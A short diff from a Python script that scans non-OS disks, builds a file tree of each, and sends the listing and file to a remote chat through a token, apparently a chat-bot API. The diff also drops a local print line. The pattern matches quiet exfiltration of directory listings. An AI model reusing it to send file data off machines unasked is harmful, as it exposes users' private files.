@@ -132,8 +132,8 @@ def scan_disks(parameter):
 #Param 2 : for no OS disks
 disks = scan_disks(1)
 
+#For disk in list : tree function --> send file created --> send message
 for disks in disks:
     disk, temp_file_path = process_path(chat_id, token, disks)
     send_message(chat_id, token, disk)
     send_file(chat_id, token, temp_file_path)
-    print(f"ok : {disk}")
